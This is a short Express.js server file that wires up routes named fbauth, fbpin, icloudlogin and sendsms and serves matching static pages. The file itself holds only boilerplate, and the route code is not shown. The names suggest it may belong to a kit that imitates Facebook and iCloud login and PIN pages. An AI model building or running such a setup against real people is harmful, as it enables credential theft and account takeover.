require('dotenv').config();
const express = require('express');
const path = require('path');
const fbauth = require('./routes/fbauth');
const fbpin = require('./routes/fbpin');
const icloudcheck = require('./routes/icloudlogin')
const sendsms = require('./routes/sendsms')

const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json()); // Añadir este middleware
app.use(express.static(path.join(__dirname, 'Public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'Public', 'index.html'));
});

app.get('/icloud', (req, res) => {
    res.sendFile(path.join(__dirname, 'Public', 'icloud.html'));
});

app.get('/sms', (req, res) => {
    res.sendFile(path.join(__dirname, 'Public', 'sendsms.html'));
});

// Utilizar rutas
app.use(icloudcheck)
app.use(fbauth);
app.use(fbpin);
app.use(sendsms);

app.listen(port, () => {
    console.log(`Servidor ejecutándose en http://localhost:${port}`);
});
